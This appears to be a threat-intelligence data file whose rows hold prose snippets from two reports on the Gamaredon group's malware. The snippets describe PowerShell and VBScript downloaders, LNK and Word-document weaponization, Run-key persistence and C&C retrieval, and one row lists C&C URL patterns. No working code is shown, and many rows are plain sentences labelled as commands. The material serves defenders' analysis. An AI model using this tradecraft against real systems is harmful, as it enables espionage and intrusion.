1.0.0,actor--gamaredon,artifact--sha256:7c1bd98a86a9f91f4eb49231dfd3a783b478a55b2e087e3212e45caac3ba4628,observation--sha256:f955b8cdbed72ccec454b380ba678f9199335fff1566e17b0c4cca9c7e61bdc3,command,The older version uses the URI /new and comprises two parts. The first part executes a brief PowerShell,The older version uses the URI /new and comprises two parts. The first part executes a brief PowerShell,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"19 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Downloader of PteroPSDoor variant 2 We know about two versions of the downloader that deploys PteroPSDoor variant 2 . Their functionality is similar, but the older one is a VBScript with an embedded PowerShell command line, while the newer one is a PowerShell script encapsulated in a VBScript. The older version uses the URI /new and comprises two parts. The first part executes a brief PowerShell comm",
1.0.0,actor--gamaredon,artifact--sha256:a821cab41ba47729bf595e48dd003bdf65c06cb9084532a8267ab967e8d9cc15,observation--sha256:db561f936fed572e09b8827ddbe2d1546dc7d9dae78694f870db48e18fde76a5,command,"The rest were Turla PowerShell payloads, which we reported on in our Gamaredon X Turla collab blogpost .","The rest were Turla PowerShell payloads, which we reported on in our Gamaredon X Turla collab blogpost",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"11 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances • a downloader, • an embedded weaponizer, and • an embedded runner. The downloader is created from an embedded template and regularly retriev es payloads from dead drops. Later instances retrieve payloads from C&C servers hidden behind tunnel services, not from dead drops. Most PteroPaste payloads seen in ESET telemetry were instances of PteroEffigy , described in a later section. The rest were Turla PowerShell payl",
1.0.0,actor--gamaredon,artifact--sha256:e38ae190bfe8dab0e4bb16f9a009a14419cce8e085fd523f804ce650e447f46c,observation--sha256:46eb373853f29f9afdf784fcf3cd3f126f68bfb6bdd4b6310a0d7f8935c0a5ad,command,This PteroPSDoor variant is a file stealer written in PowerShell that has been in use since May 2022. Its,This PteroPSDoor variant is a file stealer written in PowerShell that has been in use since May 2022. Its,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 26}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"25 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 For both vari ants, we have only seen PteroDash being used as a downloader component of PteroTemplate. PteroDig PteroDig (SHA -1: 1AEAE7A567C71200BA804801C4CEC227D2B64414 ), which we discovered in November 2022, is a PowerShell tool that weaponizes selected Desktop LNK files. It drops a basic skeleton of a downloader to %USERPROFILE% and stores relevant parts of the downloader script in the registry ",
1.0.0,actor--gamaredon,artifact--sha256:90d31b9be41fbe88aa5285f59e69983aad41288f64d02948ef3a08222a9fa678,observation--sha256:d287da60679d1d39601ed586b412bbfa7f2e446e3f2a8434a911dd6c281b3923,command,"This version can recei ve all three payload types: a URL leading to an encrypted PE file, a PowerShell","This version can recei ve all three payload types: a URL leading to an encrypted PE file, a PowerShell",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"12 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Firstly, PteroPSLoad resolves the C&C server ’s IP address from the hardcoded domain by querying the default system DNS. Secondly, it uses that IP address to send an HTTP GET request with the /get.php URI to its C&C server to fetch its updated version . Thirdly, it ensures the persistence of the downloaded update by creating an HKCU Run value that will execute it upon every system start, serving as b",
1.0.0,actor--gamaredon,artifact--sha256:d796bb1671fe24de3f61db8c1dfb193983a9a14ac699f66423020689632a7cbe,observation--sha256:fed90485b49d6614d6042d3ce5790fee121592dbd00f2c71dff9997b30e1fb56,command,"Throughout 2025, Gamaredon used the PowerShell and VBScript versions concurrently.","Throughout 2025, Gamaredon used the PowerShell and VBScript versions concurrently",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 26}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"26 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Figure 16. An example of a PteroVDoor decryptor Persistence PteroVDoor instances observed until May 31st, 2025 ensure persistence via the HKCU Run key with the registry value named GooglePhone . The instances observed between May 31st, 2025 and September 18th, 2025 don’t use any persistence mechanisms. And the instances observed after September 18th, 2025 are persisted via the PteroVDoor decryptor, which loads them ",
1.0.0,actor--gamaredon,artifact--sha256:fe5ce5165f9fff554974f17b75955ae2964a9352b7bb34c806e8b790170182e2,observation--sha256:9c985e4090e19b7bb868f3d3bfe18a81177084703d50350ae91f05f7c689b3d1,command,VBScript that launched mshta.exe with a URL as an argument to download another HTA file. This,VBScript that launched mshta.exe with a URL as an argument to download another HTA file. This,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"5 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 organization. These two methods are described rather briefly in this section, because they are examined in det ail in the respective sections covering the tools involved. Spearphishing campaigns A typical Gamaredon spearphishing campaign employs a spearphishing email with a malicious attachment that contains either a LNK or an HTA file that is served to a potential victim. The files from email attachm",
1.0.0,actor--gamaredon,artifact--sha256:8fec4420384823652b76742750040659aa1547a0a2abe25fd50be2e21087cf53,observation--sha256:12f450da7728c0fcaffff03c0bb01ac19d043d932193a1c458a9f9ccbb537a10,command,"We discovered PteroPaste on February 18th, 2025, and it’s a PowerShell tool with functionality to","We discovered PteroPaste on February 18th, 2025, and it’s a PowerShell tool with functionality to",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"10 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Figure 4. PteroDum Capabilities PteroDum can fetch and execute up to 10 VBScript payloads from a hardcoded C&C server. When PteroDum receives a response, it expects that response to be a base64 -encoded VBScript with ;; tokens inserted at random positions. After removing those tokens and decoding the result, PteroDum stores the VBScript in a randomly named file with a .vbs extension in the system temporary directory",
1.0.0,actor--gamaredon,artifact--sha256:607003168f5b2462dce588f3fe8bd53f5727f05699404fded7b0687d1a2c31fd,observation--sha256:d257a7bf36bf3d32ed818ba74166c03aaf8bb4ef5f7bff00e9b8ccff4ee4d169,command,"When the LNK file is first created, its target is set to execute a PowerShell one -liner. Then, when the LNK","When the LNK file is first created, its target is set to execute a PowerShell one -liner. Then, when the LNK",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"14 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances After the LNK file is created, the weaponizer component first appends a single * character to the file, and then also appends a PowerShell command that spawns a new PowerShell process that decodes and executes an embedded base64 -encoded downloader while passing a hardcoded R entry URL as an argument to the downloader’s only function – run. When the LNK file is first created, its target is set to execute a PowerShel",
1.0.0,actor--gamaredon,artifact--sha256:9a0bdba7d19b2126a0a334cb3ab29a1ab9a87dae43d48cdad8a2c41e0cb50fa1,observation--sha256:bf056d35e705dd83d22e859ccb63e84e8f6a94c13da9f6ed3c75c073a29d59ca,command,a PowerShell command preceded by the ! character. This leading character is removed and the rest of,a PowerShell command preceded by the ! character. This leading character is removed and the rest of,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"16 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 · a remote template that has been downloaded by a Word document weaponized by PteroTemplate, and · a default Word template ( Normal.dotm ) weaponized by PteroTemplate. The process of weaponizing Word documents and templates is described in detail in the respective sections of the PteroDoc and PteroTemplate sections. Note that the downloader is only dropped when the documents are closed, which trigger",
1.0.0,actor--gamaredon,artifact--sha256:5090e1e2e15578a6f5c22aa493072304c3d56921aae21b562c21c3966eb4f490,observation--sha256:3c0eb45a8edcd4fc6cfc84e8f3d1de53a7d616d3affc13fe5a0fd9db5292ce1d,command,aforementioned three services. Making outbound connections from curl.exe may appear less,aforementioned three services. Making outbound connections from curl.exe may appear less,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"13 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Surprisingly, the update mechanism was completely removed from this version of PteroPSLoad. Regarding the communication protocol, two significant changes were made. The first one is that a new method of obtaining the IP address of the C&C server was added. PteroPSLoad now leverages a DNS - over-HTTPS (DoH) service provided by Cloudflare. To get the IP address, it sends an HTTP GET request to https://",
1.0.0,actor--gamaredon,artifact--sha256:5cf2b546136236e54f9db30141a9f21cadcdc5e17972fcca0eee1c5744caefc9,observation--sha256:1fdcfc5f5fe492b7c69936ec1b7a94d8c98c1383e08c3c4b810b8ae08dc55135,command,"an encrypted PE file, a PowerShell command , or an encrypted VBScript file.","an encrypted PE file, a PowerShell command , or an encrypted VBScript file",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"13 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Surprisingly, the update mechanism was completely removed from this version of PteroPSLoad. Regarding the communication protocol, two significant changes were made. The first one is that a new method of obtaining the IP address of the C&C server was added. PteroPSLoad now leverages a DNS - over-HTTPS (DoH) service provided by Cloudflare. To get the IP address, it sends an HTTP GET request to https://",
1.0.0,actor--gamaredon,artifact--sha256:9e2e08f49ea23e24a676760e3e8a8ac4f174803f899a91ad9f339058c4da0128,observation--sha256:961b2f423b5568aa5692da5436a41d58039c17c2cbd720c4edae57d10ce46aa1,command,"and set to spawn a new PowerShell process that, once an hour, reads the downloader component from","and set to spawn a new PowerShell process that, once an hour, reads the downloader component from",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"11 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances • a downloader, • an embedded weaponizer, and • an embedded runner. The downloader is created from an embedded template and regularly retriev es payloads from dead drops. Later instances retrieve payloads from C&C servers hidden behind tunnel services, not from dead drops. Most PteroPaste payloads seen in ESET telemetry were instances of PteroEffigy , described in a later section. The rest were Turla PowerShell payl",
1.0.0,actor--gamaredon,artifact--sha256:f29324214f4e327242d4b2a935c25a867274e6482e7a424aa97d0efb7ff99cd6,observation--sha256:b98adbe08adb6cfa97bde6a468653d5e1c91b934d42e8a3dc8b9e3712316892d,command,argument that instructs PowerShell to launch first the original executable file and then also the,argument that instructs PowerShell to launch first the original executable file and then also the,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 26}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"25 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 For both vari ants, we have only seen PteroDash being used as a downloader component of PteroTemplate. PteroDig PteroDig (SHA -1: 1AEAE7A567C71200BA804801C4CEC227D2B64414 ), which we discovered in November 2022, is a PowerShell tool that weaponizes selected Desktop LNK files. It drops a basic skeleton of a downloader to %USERPROFILE% and stores relevant parts of the downloader script in the registry ",
1.0.0,actor--gamaredon,artifact--sha256:c10db0fc11fc7ded0b1ef479dada4e2ba26d33cc78954fedb05d6ca6380e231a,observation--sha256:07c74bebed74058e82c9ae226f1564b79d142813f6652a4e3029b8c4a773470a,command,"argument, then uses the C&C server to download and execute up to 20 PowerShell payloads. After each","argument, then uses the C&C server to download and execute up to 20 PowerShell payloads. After each",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"14 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances After the LNK file is created, the weaponizer component first appends a single * character to the file, and then also appends a PowerShell command that spawns a new PowerShell process that decodes and executes an embedded base64 -encoded downloader while passing a hardcoded R entry URL as an argument to the downloader’s only function – run. When the LNK file is first created, its target is set to execute a PowerShel",
1.0.0,actor--gamaredon,artifact--sha256:77544a6f50dc20f77ae1726e2def320933eeb53947c29f721259d4b09173d8b3,observation--sha256:079917e8d401953efd3ecfe237619b6abbe809ab7ffbe0f90dfcfd61be14d29a,command,cleartext PowerShell downloader to a separate file named with the value of the %PROCESSOR_REVISION %,cleartext PowerShell downloader to a separate file named with the value of the %PROCESSOR_REVISION %,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"14 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances After the LNK file is created, the weaponizer component first appends a single * character to the file, and then also appends a PowerShell command that spawns a new PowerShell process that decodes and executes an embedded base64 -encoded downloader while passing a hardcoded R entry URL as an argument to the downloader’s only function – run. When the LNK file is first created, its target is set to execute a PowerShel",
1.0.0,actor--gamaredon,artifact--sha256:879e8967f5ffaeac6e2b8dfabed60e50360764645fff04b6e5f30511e7a1909d,observation--sha256:527bf67c99e913e4ce1f37fc8a8e48e513717dc9041eadd0031bc5d3d5758aba,command,command line embedded as cl eartext in a VBScript wrappe r. Subsequent instances saw the PowerShell,command line embedded as cl eartext in a VBScript wrappe r. Subsequent instances saw the PowerShell,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,18 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Associated URL patterns Downloader of PteroSteal http://<IP>/pass http://<IP>/password http://<IP>/scripts/password.txt http://<IP>/admin/password.txt http://<IP>/test/password.txt http://<IP>/log/password.txt http://<IP>/in dex/password.txt http://<IP>/files/password.txt http://<IP>/local/password.txt http://<IP>/js/password.txt http://<IP>/phpmyadmin/password.txt http://<IP>/core/password.txt http:,
1.0.0,actor--gamaredon,artifact--sha256:e22fcb7b50c1a20df26875b59073c225dddde853663ff8723841400e0ac5c48c,observation--sha256:0d0116421c9b7a28e98774a7a324d4df7c223a2a33faa8e46361e17edfee72dc,command,"compromised system with VBScript or PowerShell versions of PteroLNK. Both tools, when deployed on","compromised system with VBScript or PowerShell versions of PteroLNK. Both tools, when deployed on",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"7 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Weaponized Word documents Gamaredon also compromises new targets using the victim’s Word documents , weaponized by either PteroDoc or PteroTemplate. These documents then download a malicious remote template that delivers PteroDash , which can download additional payloads to a newly compromised system . PteroDoc, when deployed to an already compromised system , weaponizes all Word documents on a system",
1.0.0,actor--gamaredon,artifact--sha256:c3596df007361bd593864d6bca0d0286223c3629463cb1ec468c2328a6f19098,observation--sha256:f019bb45a823670dce332284b4a9b1f3ffa30f8227fc4f447ebfc8c1a525b241,command,"curl.exe on Windows 10 and 11 . If this attempt is unsuccessful, it tries to utilize nslooku p.exe to query","curl.exe on Windows 10 and 11 . If this attempt is unsuccessful, it tries to utilize nslooku p.exe to query",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"14 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 This whole functionality was later removed from PteroPSLoad. account.php This version, in comparison to the previous one, contains two notable changes. The first in the persistence mechanism used, and the second in the way that it communicates with its C&C server. Persistence is ensured by dropping a small PowerShell loader with a randomly generated filename to %ALLUSERSPROFILE% and scheduling it to ",
1.0.0,actor--gamaredon,artifact--sha256:a1d755b546b8cd8bd6dfe6b35e4779e2ebed1bf36b96655a57610fe2447f9add,observation--sha256:2209ffdbf3a35fb46d59ed2e5f4ec75814d974f8d410924ed54330df992ccf68,command,dedicated downloaders. These payloads are typically written in VBScript or PowerShell and encapsulated,dedicated downloaders. These payloads are typically written in VBScript or PowerShell and encapsulated,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 5}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"5 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances simulate downloading such archives. These archives contain a malicious HTA downloader that , when opened by a victim, launche s mshta.exe with a URL argument to fetch another HTA file that embeds the VBScript downloader, PteroSand (see Figure 1). Notably, in two campaigns, the HTA downloaders were compressed with bzip2 instead of being packed in archives. Figure 1. Simplified scheme of a typical Gama redon spearphish",
1.0.0,actor--gamaredon,artifact--sha256:d5fb88251e69d98fa72cf0765e84720f8f8ed6eab6f69a972b7f8d9fc3465bfb,observation--sha256:d48beb137dc5c1aab0bf7376da1c82921fece065e05201162b39167e0b299d7b,command,"despite similar functionality to the previous version, i t’s written entirely in PowerShell within a simple","despite similar functionality to the previous version, i t’s written entirely in PowerShell within a simple",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"19 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Downloader of PteroPSDoor variant 2 We know about two versions of the downloader that deploys PteroPSDoor variant 2 . Their functionality is similar, but the older one is a VBScript with an embedded PowerShell command line, while the newer one is a PowerShell script encapsulated in a VBScript. The older version uses the URI /new and comprises two parts. The first part executes a brief PowerShell comm",
1.0.0,actor--gamaredon,artifact--sha256:04c97ce92e8e40cbc07e38cf5a12f35a6d6b40448e6638c30054ecbf560f3931,observation--sha256:48615b7cc15e6c29808a7568c58f59b3c12ccf248a95689f97ca4a3681857fca,command,"each part . Thirdly, it drops a brief VBScript to %TMP% \runner.tmp , which runs a PowerShell command","each part . Thirdly, it drops a brief VBScript to %TMP% \runner.tmp , which runs a PowerShell command",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"19 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Downloader of PteroPSDoor variant 2 We know about two versions of the downloader that deploys PteroPSDoor variant 2 . Their functionality is similar, but the older one is a VBScript with an embedded PowerShell command line, while the newer one is a PowerShell script encapsulated in a VBScript. The older version uses the URI /new and comprises two parts. The first part executes a brief PowerShell comm",
1.0.0,actor--gamaredon,artifact--sha256:440372dc835bcb939aca43e282f8399b77a13a5ec4115d7a3ad252e2e2802123,observation--sha256:d3b862204dc60466703d111745b8e929b42b0618296b72f193488fecb9e2e365,command,"encoded PowerShell downloader to the created malicious LNK, the updated weaponizer drops the","encoded PowerShell downloader to the created malicious LNK, the updated weaponizer drops the",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"14 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances After the LNK file is created, the weaponizer component first appends a single * character to the file, and then also appends a PowerShell command that spawns a new PowerShell process that decodes and executes an embedded base64 -encoded downloader while passing a hardcoded R entry URL as an argument to the downloader’s only function – run. When the LNK file is first created, its target is set to execute a PowerShel",
1.0.0,actor--gamaredon,artifact--sha256:6e6c540828bdd13276a728edb06ac2966151567af6b822b2071cf69ed516d6f5,observation--sha256:14c8dd8af904509144526d366700b73c2b9d88d15fe8569e2819f12bcc69ce1e,command,execute a short PowerShell command line that just d ownloads PteroPSDoor variant 1 from the,execute a short PowerShell command line that just d ownloads PteroPSDoor variant 1 from the,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,18 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Associated URL patterns Downloader of PteroSteal http://<IP>/pass http://<IP>/password http://<IP>/scripts/password.txt http://<IP>/admin/password.txt http://<IP>/test/password.txt http://<IP>/log/password.txt http://<IP>/in dex/password.txt http://<IP>/files/password.txt http://<IP>/local/password.txt http://<IP>/js/password.txt http://<IP>/phpmyadmin/password.txt http://<IP>/core/password.txt http:,
1.0.0,actor--gamaredon,artifact--sha256:ff02e2e9f7a07cae914fa38d0c4542b59c62c243375dfbf390f45465b01ad3f6,observation--sha256:fcdc5a246eec08f6417a04d0b84b468aafb385a283a0783104b1065726d1bbb1,command,executes a PowerShell payload.,executes a PowerShell payload,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 42}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,41 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 025E3D88C53FC12D5A4A AB726E696F2815BAC84D N/A VBS/Pterodo.TX PteroPSLoad – PowerShell downloader. D5576E578518E474A5DF F654C44AB3EC4A6E4ECF N/A PowerShell/Pterodo.FD PteroPSLoad – PowerShell downloader. 28F4F0367C2BB0574C8A 7D1B9C3E71E6AC678300 N/A PowerShell/Pterodo.AV PteroPSLoad – PowerShell downloader. E0BD8855159CB708789C 4DE183E107C5C117FBA1 N/A PowerShell/P,
1.0.0,actor--gamaredon,artifact--sha256:2464d24ad4b25af11867204901771d1750dbcf9aca1b50c6a6f2727bbb9d4fa6,observation--sha256:d07641cf7a687c1691edce90371b0f795edb6c4e0c2b3ccd1f623bd99f8528a1,command,"expects any response it receives to be a PowerShell script – which is then immediately executed, without","expects any response it receives to be a PowerShell script – which is then immediately executed, without",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"9 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Figure 3. PteroDee (prettified) We saw this tool for the last time on August 4th, 2025; it was most likely discontinued, and perhaps replaced with PteroCache , which Gamaredon started deploying regularly from July 31st, 2025 onward. Capabilities PteroDee can fetch and execute up to 10 PowerShell payloads from a hardcoded C&C server. PteroDee expects any response it receives to be a PowerShell script – which is then i",
1.0.0,actor--gamaredon,artifact--sha256:c1ecea0243ea0792a976dd1754a7836b9a813b8224ff6dc77c70910012693113,observation--sha256:3b17c2896c913725d16c1cfc93d8b86d942ea2be9eb12689e049b0d053b3402f,command,"file, a PowerShell command, and an encrypted VBScript file . The downloader decides how to process","file, a PowerShell command, and an encrypted VBScript file . The downloader decides how to process",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"10 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 General -purpose downloaders We recognize eight types of general -purpose downloaders: five standalone and three built -in. Standalone downloaders primarily deliver payloads, whereas built -in dow nloaders have other primary capabilities but can also deliver payloads. PteroPSLoad PteroPSLoad is a downloader written in PowerShell that we discovered in October 2021 . After it is deployed, it remains pe",
1.0.0,actor--gamaredon,artifact--sha256:dc0cff58ec4796afcea897ee951a5e8b40f1ee132ed8fe3c0f99f2fca58a7d37,observation--sha256:70516b1f504e83a8abdfadc9a8a062dfda613a6107cd75833cc9fa4a4ba6f8c4,command,in PowerShell and is deployed encapsulated in VBScript. PteroCache does not use any persistence,in PowerShell and is deployed encapsulated in VBScript. PteroCache does not use any persistence,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"16 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Figure 11. PteroEffigy Capabilities PteroEffigy acquires its C&C server from the G oFile cloud storage service using its REST API. Then, from the retrieved C&C server, it can download and execute up to 50 PowerShell payloads. After each individual download attempt, it sleeps for five minutes. Network protocol For communication with its C&C server, PteroEffigy uses an HTTP GET request with the URI path /index.php and",
1.0.0,actor--gamaredon,artifact--sha256:78374c304e983c590e1f7aa9df050dea7f8e6beb0a8db35bcd708c0ad849cac8,observation--sha256:ee323c0abe0d0ae13ee7be1f0a9e6affc0e09743d98cbaf9e6e8404bd689f71e,command,"is similar, but the older one is a VBScript with an embedded PowerShell command line, while the newer","is similar, but the older one is a VBScript with an embedded PowerShell command line, while the newer",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"19 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Downloader of PteroPSDoor variant 2 We know about two versions of the downloader that deploys PteroPSDoor variant 2 . Their functionality is similar, but the older one is a VBScript with an embedded PowerShell command line, while the newer one is a PowerShell script encapsulated in a VBScript. The older version uses the URI /new and comprises two parts. The first part executes a brief PowerShell comm",
1.0.0,actor--gamaredon,artifact--sha256:184e6a6b2f19c9d55366c0264a34522d0587f49d719463d6de4c69743138ebb2,observation--sha256:f3df8b1c2415338803af8e4ff6fd529fee7a8c1eb4917712fa0ffb6ec35e9bec,command,"it runs a PowerShell one- liner that loads the downloader from this file. Also, the R entry URL is no longer","it runs a PowerShell one- liner that loads the downloader from this file. Also, the R entry URL is no longer",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"14 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances After the LNK file is created, the weaponizer component first appends a single * character to the file, and then also appends a PowerShell command that spawns a new PowerShell process that decodes and executes an embedded base64 -encoded downloader while passing a hardcoded R entry URL as an argument to the downloader’s only function – run. When the LNK file is first created, its target is set to execute a PowerShel",
1.0.0,actor--gamaredon,artifact--sha256:a169d1756c9a890ba5e68d2cf21c21eeea49f972e367008d4c4ae4a9bba73433,observation--sha256:d636074e663a56fb1bdf3e4104e06e7396240592e381b015bb46d85b8db5cbd0,command,"its arsenal throughout 2022 and 2023. These new tools are developed mainly in PowerShell, which has","its arsenal throughout 2022 and 2023. These new tools are developed mainly in PowerShell, which has",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 39}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"38 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 NETWORK INFRASTRUCTURE Gamaredon uses a technique known as fast flux DNS for its network infrastructure – frequently changing its C&C servers’ IP addresses , usually several times per day, to avoid IP -based blocking. It also frequently registers and updates many new C&C domains to avoid domain -based blocking, mainly using.ru as the top -level domain (TLD). Very rarely, we also saw these TLDs being ",
1.0.0,actor--gamaredon,artifact--sha256:fa22c8b685fc779365805edfc1959f83034728c6ee240c725b71edae2f2158d9,observation--sha256:18e082f6b5ce56ae7ecad0e42f2da3e020fdb3395afd8623c509f95a0028522c,command,"leading to an encrypted PE file, a PowerShell command , or an encrypted VBScript file.","leading to an encrypted PE file, a PowerShell command , or an encrypted VBScript file",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"14 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 This whole functionality was later removed from PteroPSLoad. account.php This version, in comparison to the previous one, contains two notable changes. The first in the persistence mechanism used, and the second in the way that it communicates with its C&C server. Persistence is ensured by dropping a small PowerShell loader with a randomly generated filename to %ALLUSERSPROFILE% and scheduling it to ",
